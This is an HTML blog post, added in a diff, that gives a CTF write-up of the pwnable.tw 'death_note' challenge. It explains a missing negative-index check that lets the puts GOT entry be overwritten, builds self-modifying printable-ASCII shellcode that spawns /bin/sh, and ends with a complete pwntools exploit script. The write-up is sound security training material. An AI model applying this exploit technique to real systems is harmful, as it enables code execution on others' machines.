@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self'; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; connect-src 'self'; media-src 'self'; object-src 'self'; child-src 'self'; form-action 'none'; base-uri 'self'" />
+<meta http-equiv="X-XSS-Protection"  content="1;mode=block" always>
+<meta http-equiv="Referrer-Policy" content="no-referrer, strict-origin-when-cross-origin"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>death_note [pwnable.tw]</title><!-- Begin Jekyll SEO tag v2.7.1 -->
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="death_note [pwnable.tw]" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="death_note [pwnable.tw] The binary given is a 32-bit ELF. Here is its checksec output:" />
+<meta property="og:description" content="death_note [pwnable.tw] The binary given is a 32-bit ELF. Here is its checksec output:" />
+<link rel="canonical" href="http://localhost:4000/pwn/2021/05/30/death_note.html" />
+<meta property="og:url" content="http://localhost:4000/pwn/2021/05/30/death_note.html" />
+<meta property="og:site_name" content="k1R4’s blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-05-30T19:45:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="death_note [pwnable.tw]" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"death_note [pwnable.tw]","dateModified":"2021-05-30T19:45:00+05:30","datePublished":"2021-05-30T19:45:00+05:30","url":"http://localhost:4000/pwn/2021/05/30/death_note.html","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/pwn/2021/05/30/death_note.html"},"description":"death_note [pwnable.tw] The binary given is a 32-bit ELF. Here is its checksec output:","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" type="text/css" href="/assets/main-dark.css"></head>
+<body>
+    <div class="container"><header>
+  <div class="menu">
+    <ul><li><a href="/">/blog</a></li><li><a href="/about/">/about</a></li><li><a href="/contact/">/contact</a></li></ul>
+  </div>
+</header>
+<main>
+      <h1 id="death_note-pwnabletw-">death_note [pwnable.tw] <br /><br /></h1>
+<p>The binary given is a 32-bit ELF. Here is its checksec output:</p>
+
+<p><img src="/images/death_note/checksec.png" alt="checksec-output" /></p>
+
+<p>The challenge description is: <strong>Write the shellcode on your Death Note.</strong>
+It is clear from this that its a shellcode challenge. Now time to hunt for the bug!</p>
+
+<p>Using ghidra to decompile, it can be seen that there is a bug in the add_note function:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">add_note</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">iVar2</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">pcVar3</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">in_GS_OFFSET</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">local_60</span> <span class="p">[</span><span class="mi">80</span><span class="p">];</span>
+  <span class="kt">int</span> <span class="n">local_10</span><span class="p">;</span>
+
+  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_GS_OFFSET</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Index :"</span><span class="p">);</span>
+  <span class="n">iVar1</span> <span class="o">=</span> <span class="n">read_int</span><span class="p">();</span>
+  <span class="k">if</span> <span class="p">(</span><span class="mi">10</span> <span class="o">&lt;</span> <span class="n">iVar1</span><span class="p">)</span> <span class="p">{</span>	<span class="c1">// Bug here O_O</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Out of bound !!"</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Name :"</span><span class="p">);</span>
+  <span class="n">read_input</span><span class="p">(</span><span class="n">local_60</span><span class="p">,</span><span class="mh">0x50</span><span class="p">);</span>
+  <span class="n">iVar2</span> <span class="o">=</span> <span class="n">is_printable</span><span class="p">(</span><span class="n">local_60</span><span class="p">);</span> <span class="c1">// Checks if shellcode is printable</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">iVar2</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">pcVar3</span> <span class="o">=</span> <span class="n">strdup</span><span class="p">(</span><span class="n">local_60</span><span class="p">);</span>
+    <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)(</span><span class="n">note</span> <span class="o">+</span> <span class="n">iVar1</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="n">pcVar3</span><span class="p">;</span> <span class="c1">// input pointer stored at note+index*4</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Done !"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_GS_OFFSET</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">))</span> <span class="p">{</span>
+      <span class="n">__stack_chk_fail</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="k">return</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"It must be a printable name !"</span><span class="p">);</span>
+  <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+<p><br /></p>
+
+<p>The program checks only if our offset is greater than 10, it doesn’t check for negative values. Also it can be seen that our input is constrainted to be only printable ASCII characters (numbers, symbols, uppercase &amp; lowercase alphabets)</p>
+
+<p>The GOT addresses are at a negative offset from <strong>note</strong>, so providing a specific negative index in add_note will overwrite GOT with a pointer to our input on heap. puts is called after the overwrite so overwriting puts will work in this case. Calculating the offset of puts from note we get <code class="language-plaintext highlighter-rouge">-64</code>, so our index will be -16.</p>
+
+<p>Now the fun part - shellcode! Since shellcode is limited to printable characters, we have pop, push &amp; certain xor instructions. Also there is a pointer to our shellcode in edx.</p>
+
+<p>My plan is to call an execve syscall. I started off by pushing “/bin///sh” on stack and moving it to ebx.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">push</span> <span class="mh">0x68</span>
+<span class="n">push</span> <span class="mh">0x732f2f2f</span>
+<span class="n">push</span> <span class="mh">0x6e69622f</span>
+<span class="n">push</span> <span class="n">esp</span>
+<span class="n">pop</span> <span class="n">ebx</span></code></pre></figure>
+<p><br />
+The next obstacle is that <code class="language-plaintext highlighter-rouge">int 0x80</code> which is essential to make a syscall assembles to “\xcd\x80” which is not printable. To workaround this, the shellcode can be made such that it uses xor to alter the last 2 bytes of input to 0xcd &amp; 0x80. Hence last two bytes of shellcode will be “ +” which on xoring induvidually with 0x53 &amp; 0x70 give “\xcd\x80”.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">push</span> <span class="n">edx</span>
+<span class="n">pop</span> <span class="n">eax</span>
+<span class="n">push</span> <span class="mh">0x53</span>
+<span class="n">pop</span> <span class="n">edx</span>
+<span class="n">sub</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mi">39</span><span class="p">],</span><span class="n">dl</span>
+<span class="n">sub</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mi">40</span><span class="p">],</span><span class="n">dl</span>
+<span class="n">push</span> <span class="mh">0x70</span>
+<span class="n">pop</span> <span class="n">edx</span>
+<span class="n">xor</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mi">40</span><span class="p">],</span><span class="n">dl</span></code></pre></figure>
+<p><br />
+Finally eax,ecx and edx have to be set to appropriate values in order to perform the execve syscall.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">push</span> <span class="n">ecx</span>
+<span class="n">pop</span> <span class="n">eax</span>
+<span class="n">push</span> <span class="n">ecx</span>
+<span class="n">pop</span> <span class="n">edx</span>
+<span class="n">xor</span> <span class="n">al</span><span class="p">,</span><span class="mi">43</span>
+<span class="n">xor</span> <span class="n">al</span><span class="p">,</span><span class="mi">32</span></code></pre></figure>
+<p><br />
+Now the shellcode is done! Time to finish off the exploit.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/env python2
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./death_note"</span><span class="p">)</span>
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="s">"kitty sh -c"</span><span class="p">.</span><span class="n">split</span><span class="p">()</span>
+<span class="n">IP</span><span class="p">,</span> <span class="n">PORT</span> <span class="o">=</span> <span class="s">"chall.pwnable.tw"</span><span class="p">,</span> <span class="mi">10201</span>
+
+<span class="k">global</span> <span class="n">io</span>
+<span class="n">breakpoints</span> <span class="o">=</span> <span class="s">'''
+break *0x80487ea
+continue
+'''</span>
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"-r"</span><span class="p">:</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">IP</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+<span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"-ng"</span><span class="p">:</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">breakpoints</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">s</span><span class="p">(</span><span class="n">a</span><span class="p">):</span> <span class="k">return</span> <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">sa</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span> <span class="k">return</span> <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">sl</span><span class="p">(</span><span class="n">a</span><span class="p">):</span> <span class="k">return</span> <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">sla</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span> <span class="k">return</span> <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">re</span><span class="p">(</span><span class="n">a</span><span class="p">):</span> <span class="k">return</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">reu</span><span class="p">(</span><span class="n">a</span><span class="p">):</span> <span class="k">return</span> <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">rl</span><span class="p">():</span> <span class="k">return</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">(</span><span class="bp">False</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">add_note</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span><span class="n">payload</span><span class="p">):</span>
+    <span class="n">reu</span><span class="p">(</span><span class="s">" :"</span><span class="p">)</span>
+    <span class="n">s</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">reu</span><span class="p">(</span><span class="s">" :"</span><span class="p">)</span>
+    <span class="n">s</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">offset</span><span class="p">))</span>
+    <span class="n">reu</span><span class="p">(</span><span class="s">" :"</span><span class="p">)</span>
+    <span class="n">sl</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">is_printable</span><span class="p">(</span><span class="n">shellcode</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)):</span>
+        <span class="k">if</span> <span class="nb">ord</span><span class="p">(</span><span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mh">0x1f</span> <span class="ow">or</span> <span class="nb">ord</span><span class="p">(</span><span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">&gt;</span> <span class="mh">0x7f</span><span class="p">:</span>
+            <span class="k">return</span> <span class="bp">False</span>
+    <span class="k">return</span> <span class="bp">True</span>
+
+<span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s">'''
+    push 0x68
+    push 0x732f2f2f
+    push 0x6e69622f
+    push esp
+    pop ebx
+
+    push edx
+    pop eax
+    push 0x53
+    pop edx
+    sub byte ptr [eax+39],dl
+    sub byte ptr [eax+40],dl
+    push 0x70
+    pop edx
+    xor byte ptr [eax+40],dl
+  
+    push ecx
+    pop eax
+    push ecx
+    pop edx
+    xor al,43
+    xor al,32
+'''</span><span class="p">)</span><span class="o">+</span><span class="s">"</span><span class="se">\x20\x43</span><span class="s">"</span>
+
+<span class="k">assert</span> <span class="n">is_printable</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+
+<span class="n">add_note</span><span class="p">(</span><span class="o">-</span><span class="mi">16</span><span class="p">,</span><span class="n">shellcode</span><span class="p">)</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>
+
+
+    </main><footer>
+  follow me on <a href="https://twitter.com/__k1R4">twitter</a> :)
+</footer>
+</div>
+  </body>
+</html>
